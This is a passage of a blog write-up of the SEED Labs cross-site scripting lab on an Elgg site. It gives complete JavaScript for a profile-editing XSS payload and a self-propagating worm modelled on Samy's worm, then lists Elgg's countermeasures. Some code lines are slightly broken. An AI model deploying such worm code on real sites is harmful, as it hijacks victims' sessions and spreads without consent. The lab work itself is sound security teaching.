        <span class="n">wr</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">data</span><span class="o">);</span>
        <span class="n">wr</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>

        <span class="c1">// HttpURLConnection a subclass of URLConnection is returned by</span>
        <span class="c1">// url.openConnection() since the url is an http request.</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">urlConn</span> <span class="k">instanceof</span> <span class="nc">HttpURLConnection</span><span class="o">)</span> <span class="o">{</span>
            <span class="nc">HttpURLConnection</span> <span class="n">httpConn</span> <span class="o">=</span> <span class="o">(</span><span class="nc">HttpURLConnection</span><span class="o">)</span> <span class="n">urlConn</span><span class="o">;</span>
            <span class="c1">// Contacts the web server</span>
            <span class="c1">// gets the status code from HTTP Response message.</span>
            <span class="n">responseCode</span> <span class="o">=</span> <span class="n">httpConn</span><span class="o">.</span><span class="na">getResponseCode</span><span class="o">();</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Response Code = "</span> <span class="o">+</span> <span class="n">responseCode</span><span class="o">);</span>

            <span class="c1">// HTTP status code</span>
            <span class="c1">// HTTP_OK means the response was received Successfully.</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">responseCode</span> <span class="o">==</span> <span class="nc">HttpURLConnection</span><span class="o">.</span><span class="na">HTTP_OK</span><span class="o">){</span>
                <span class="c1">// Get the input stream from url connection object.</span>
                <span class="n">responseIn</span> <span class="o">=</span> <span class="n">urlConn</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
                <span class="c1">// Create an instance for BufferedReader</span>
                <span class="c1">// to read the response line by line.</span>
                <span class="nc">BufferedReader</span> <span class="n">buf_inp</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedReader</span><span class="o">();</span>
                <span class="k">new</span> <span class="nf">InputStreamReader</span><span class="o">(</span><span class="n">responseIn</span><span class="o">));</span>
                <span class="nc">String</span> <span class="n">inputLine</span><span class="o">;</span>
                <span class="k">while</span><span class="o">((</span><span class="n">inputLine</span> <span class="o">=</span> <span class="n">buf_inp</span><span class="o">.</span><span class="na">readLine</span><span class="o">())!=</span><span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">inputLine</span><span class="o">);</span>
                    <span class="o">}</span>
                <span class="o">}</span>
            <span class="o">}</span>
            <span class="k">catch</span> <span class="o">(</span><span class="nc">MalformedURLException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><hr /><h2 id="task-5--writing-an-xss-worm">Task 5 : Writing an XSS worm</h2><ul><li>coding a worm which can change the information of an account in the web app.<ul><li>This requires the analysis of changing the ‘about me’ section in the web app.</ul><li>The attacker user11 uses the other account samy to update the ‘about me’ section to study the process.<li>The ‘inspect element’ reveals that the process is a <code class="language-plaintext highlighter-rouge">POST request</code> which requires few parameters from the document.<ul><li>These parameters are specific to the session and the user,<li>therefore, searching the parameters in the document</ul></ul><p>The javascript code must contain</p><ul><li>the <code class="language-plaintext highlighter-rouge">post request</code> required to proceed<li>with the changing of the text in the ‘about me’ section.<li>this will not affect others who view this profile.</ul><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="kd">var</span> <span class="nx">sendurl</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网址www.xsslabelgg.com/action/profile/edit</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">ts</span><span class="o">=</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token__elgg_ts</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">token</span><span class="o">=</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_token</span><span class="p">;</span>

<span class="nx">ff</span><span class="o">=</span><span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>

<span class="nx">ff</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span><span class="nx">sendurl</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Host</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">www.xsslabelgg.com</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Keep-Alive</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">300</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Connection</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">keep-alive</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Cookie</span><span class="dl">"</span><span class="p">,</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>

<span class="c1">//                             http网址www.xsslabelgg.com/profile/         user14                  /edit</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Referer</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">http网址www.xsslabelgg.com/profile/</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">[</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">]</span><span class="o">+</span><span class="dl">"</span><span class="s2">/edit</span><span class="dl">"</span><span class="p">);</span>

<span class="c1">//      __elgg_ts=AAAA  &amp;__elgg_token=BBBB     &amp;description=User-11-is-great   &amp;name=user14  &amp;accesslevel[description]=2  &amp;guid=user14Id0000001</span>
<span class="nx">params</span><span class="o">=</span><span class="dl">"</span><span class="s2">__elgg_ts=</span><span class="dl">"</span><span class="o">+</span><span class="nx">ts</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;__elgg_token=</span><span class="dl">"</span><span class="o">+</span><span class="nx">token</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;description=User-11-is-great</span><span class="dl">"</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;name=</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">[</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">]</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;accesslevel[description]=2&amp;guid=</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">[</span><span class="dl">"</span><span class="s2">guid</span><span class="dl">"</span><span class="p">];</span>

<span class="nx">ff</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
</pre></table></code></div></div><hr /><h2 id="task-6--creating-a-self-propagating-worm">Task 6 : Creating a self propagating worm</h2><ul><li>exponential growth<li>dynamically generate code</ul><ol><li><strong>ID/DOM Approach</strong>:<ul><li>If the entire JavaScript program (worm) is embedded in the infected profile<li>the worm code can use <code class="language-plaintext highlighter-rouge">DOM APIs</code> to retrieve a copy of itself from the web page.<li>This code gets a copy of itself, and display it in an alert window:</ul></ol><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="c1">// if f the entire JavaScript program (i.e., the worm) is embedded in the infected profile</span>
<span class="c1">// to propagate the worm to another profile</span>
<span class="c1">// the worm code can use DOM APIs to retrieve a copy of itself from the web page.</span>
<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">worm</span><span class="dl">"</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>
    <span class="kd">var</span> <span class="nx">badCode</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">worm</span><span class="dl">"</span><span class="p">);</span>
    <span class="nf">alert</span><span class="p">(</span><span class="nx">badCode</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">);</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span>
<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">worm</span><span class="dl">"</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>
    <span class="kd">var</span> <span class="nx">header</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&lt;script id=</span><span class="se">\"</span><span class="s2">worm</span><span class="se">\"</span><span class="s2"> type=</span><span class="se">\"</span><span class="s2">text/javascript</span><span class="se">\"</span><span class="s2"> &gt;</span><span class="dl">"</span><span class="p">;</span>

    <span class="c1">// innerHTML only gives us the inside part of the code, not including the surrounding script tags.</span>
    <span class="kd">var</span> <span class="nx">copy</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">worm</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span><span class="p">;</span>

    <span class="kd">var</span> <span class="nx">tail</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&lt;/</span><span class="dl">"</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">script&gt;</span><span class="dl">"</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">wormCode</span> <span class="o">=</span> <span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">header</span><span class="o">+</span><span class="nx">copy</span><span class="o">+</span><span class="nx">tail</span><span class="p">);</span>
    <span class="nf">alert</span><span class="p">(</span><span class="nx">jsCode</span><span class="p">);</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span>
<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">worm</span><span class="dl">"</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>
    <span class="c1">// construct a copy of itself</span>
    <span class="kd">var</span> <span class="nx">selfProp</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&lt;script id=</span><span class="se">\"</span><span class="s2">worm</span><span class="se">\"</span><span class="s2"> type=</span><span class="se">\"</span><span class="s2">text/javascript</span><span class="se">\"</span><span class="s2"> &gt;</span><span class="dl">"</span><span class="p">.</span><span class="nf">concat</span><span class="p">(</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">worm</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="p">).</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;/</span><span class="dl">"</span><span class="p">).</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">script&gt;</span><span class="dl">"</span><span class="p">);</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></pre></table></code></div></div><ol><li><strong>Src/Link Approach</strong>:<ul><li>If the worm is included using the <code class="language-plaintext highlighter-rouge">src</code> attribute in the <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag<li>can simply copy the <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag to the victim’s profile, essentially infecting the profile with the same worm.</ul></ol><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网站//example.com/xss_worm.js</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></pre></table></code></div></div><ol><li>example</ol><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">worm</span><span class="dl">"</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>

<span class="kd">var</span> <span class="nx">selfProp</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&lt;script id=</span><span class="se">\"</span><span class="s2">worm</span><span class="se">\"</span><span class="s2"> type=</span><span class="se">\"</span><span class="s2">text/javascript</span><span class="se">\"</span><span class="s2"> &gt;</span><span class="dl">"</span><span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">worm</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span><span class="p">).</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;/</span><span class="dl">"</span><span class="p">).</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">script&gt;</span><span class="dl">"</span><span class="p">);</span>

<span class="kd">var</span> <span class="nx">sendurl</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://www.xsslabelgg.com/action/profile/edit</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">ts</span><span class="o">=</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token__elgg_ts</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">token</span><span class="o">=</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_token</span><span class="p">;</span>

<span class="nx">ff</span><span class="o">=</span><span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span><span class="nx">sendurl</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Host</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">www.xsslabelgg.com</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Keep-Alive</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">300</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Connection</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">keep-alive</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Cookie</span><span class="dl">"</span><span class="p">,</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>

<span class="nx">ff</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Referer</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">http://www.xsslabelgg.com/profile/</span><span class="dl">"</span><span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">[</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">]).</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">/edit</span><span class="dl">"</span><span class="p">));</span>

<span class="nx">params</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">__elgg_ts=</span><span class="dl">"</span><span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="nx">ts</span><span class="p">)</span>
         <span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;__elgg_token=</span><span class="dl">"</span><span class="p">).</span><span class="nf">concat</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span>
         <span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;description=User-11-is-great</span><span class="dl">"</span><span class="p">)</span>
         <span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="nf">escape</span><span class="p">(</span><span class="nx">selfProp</span><span class="p">))</span>
         <span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;name=</span><span class="dl">"</span><span class="p">).</span><span class="nf">concat</span><span class="p">(</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">[</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">])</span>
         <span class="p">.</span><span class="nf">concat</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;accesslevel[description]=2&amp;guid=</span><span class="dl">"</span><span class="p">).</span><span class="nf">concat</span><span class="p">(</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">[</span><span class="dl">"</span><span class="s2">guid</span><span class="dl">"</span><span class="p">]);</span>

<span class="nx">ff</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
</pre></table></code></div></div><ul><li>The <code class="language-plaintext highlighter-rouge">escape()</code> function converts the <code class="language-plaintext highlighter-rouge">inner strings</code> to <code class="language-plaintext highlighter-rouge">URLencoding</code> for http transfer.<li>Now when a user views the profile of user11,<li>the user’s account will have its ‘about me’ section set to “User-11-is-great”.<li>Also the code itself will be copied to the user’s page.<li>Also now since the code is in the user’s page, whenever a user views the account of this user, the code will get executed and the new user will also have his account modified.<li>The add friend exploit can also e added to the above code as a new <code class="language-plaintext highlighter-rouge">XMLHttpRequest</code> part.<li>That code will become the exact replica of the famous Samy’s worm attack of 2005.</ul><hr /><h2 id="task-7--countermeasures">Task 7 : Countermeasures</h2><ul><li>Elgg have a built in countermeasures to defend XSS attack.<ul><li>a custom built security plugin <code class="language-plaintext highlighter-rouge">HTMLawed 1.8</code> on the Elgg web application which on activation<li>validates the user input and removes the tags from the input.<li>This specific plugin is registered to the function <code class="language-plaintext highlighter-rouge">filter_tags</code> in the <code class="language-plaintext highlighter-rouge">elgg/ engine/lib/input.php</code> file.<li>The countermeasures have been deactivated and commented out to make the attack work.<ul><li>To turn on the countermeasure, login to the application as admin, goto <code class="language-plaintext highlighter-rouge">administration -&gt; plugins</code>, and select security and spam in the dropdown menu. The <code class="language-plaintext highlighter-rouge">HTMLawed 1.8 plugin</code> is below. This can now be activated.</ul></ul><li>another built-in PHP method called <code class="language-plaintext highlighter-rouge">htmlspecialchars()</code><ul><li>to encode the special characters in the user input, such as encoding <code class="language-plaintext highlighter-rouge">"&lt;" to &amp;lt</code>, <code class="language-plaintext highlighter-rouge">"&gt;" to &amp;gt;</code>, etc.<li>Go to the directory <code class="language-plaintext highlighter-rouge">elgg/views/default/output</code> and find the function call <code class="language-plaintext highlighter-rouge">htmlspecialchars</code> in <code class="language-plaintext highlighter-rouge">text.php, tagcloud.php, tags.php, access.php, tag.php, friendlytime.php, url.php, dropdown.php, email.php</code> and <code class="language-plaintext highlighter-rouge">confirmlink.php</code> files.<li>Uncomment the corresponding <code class="language-plaintext highlighter-rouge">htmlspecialchars</code> function calls in each file.</ul></ul><hr /><p>The above was a detailed description of an XSS attack taking examples from the real world Samy’s Worm attack.</p><p>The above is a documentation of a lab experiment by the name XSS attack lab (Elgg) from publicly available seed labs by Syracuse University.</p><p>Seed Labs Copyright © Wenliang Du, Syracuse University. I do not own any software mentioned in the above document.</p><hr /><p>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/lab/'>Lab</a>, <a href='/categories/seed/'>SEED</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/lab/" class="post-tag no-text-decoration" >Lab</a> <a href="/tags/xss/" class="post-tag no-text-decoration" >XSS</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=SEED Labs – Cross-Site Scripting Attack Lab - Grace&url=https://ocholuo.github.io//posts/SEED-Labs-CrossSiteScripting-Attack-Lab/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=SEED Labs – Cross-Site Scripting Attack Lab - Grace&u=https://ocholuo.github.io//posts/SEED-Labs-CrossSiteScripting-Attack-Lab/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=SEED Labs – Cross-Site Scripting Attack Lab - Grace&url=https://ocholuo.github.io//posts/SEED-Labs-CrossSiteScripting-Attack-Lab/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Amazon-CloudFront/">AWS Lab - AWS CloudFront</a><li><a href="/posts/Alexa-1stSkill/">AWS Alex First Skill - RedVelvet Time</a><li><a href="/posts/NetworkProtocol-SSL-TLS-Handshake/">NetworkProtocol SSL/TLS Handshake</a><li><a href="/posts/pythonCrash/">Python Crash</a><li><a href="/posts/%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%A7%A3%E9%87%8AAWS/">AWS - 一句话解释AWS</a><li><a href="/posts/GKE/">GCP - Google Cloud Computing - Kubernetes and Kubernetes Engine</a><li><a href="/posts/Go-Note/">Go Note</a><li><a href="/posts/SCPs/">AWS - IdenAccessManage - SCPs (Service Control Policies)</a><li><a href="/posts/CompanyBenefit/">Company Benefit</a><li><a href="/posts/Encryption-SSL&TLS/">Cryptography - SSL/TLS Encryption</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/soc/">SOC</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/AWS-Create-simple-microservice-using-Lambda-and-API-Gateway/"><div class="card-body"> <span class="timeago small" >Jul 16, 2020<i class="unloaded">2020-07-16T11:11:11-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>AWS Lab - Create a simple microservice using Lambda and API Gateway</h3><div class="text-muted small"><p> Create a simple microservice using Lambda and API Gateway Create a simple microservice using Lambda and API Gateway overall create an API using Amazon API Gateway o...</p></div></div></a></div><div class="card"> <a href="/posts/AWS-lab/"><div class="card-body"> <span class="timeago small" >Jul 16, 2020<i class="unloaded">2020-07-16T11:11:11-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>AWS Lab</h3><div class="text-muted small"><p> AWS Lab AWS Lab 1. beginning 启动实例 2 连接实例 remote desktop 1.3 终止您的实例 2. begin 2.1 Active directory ...</p></div></div></a></div><div class="card"> <a href="/posts/LAB-AWSCertifiedCloudPractitionerexam.ACFv2EN-Interns/"><div class="card-body"> <span class="timeago small" >Jul 16, 2020<i class="unloaded">2020-07-16T11:11:11-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>AWS Lab - ACFv2EN-Interns</h3><div class="text-muted small"><p> ACFv2EN-Interns. ACFv2EN-Interns. Module 1 Overview cloud computing: different types of cloud computing models three main cloud computing deplo...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/ECS/" class="btn btn-outline-primary" prompt="Older"><p>AliCloud - ECS</p></a> <a href="/posts/Jekyll/" class="btn btn-outline-primary" prompt="Newer"><p>Create a blog using Jekyll</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/ocholuo">Grace JyL</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/soc/">SOC</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script 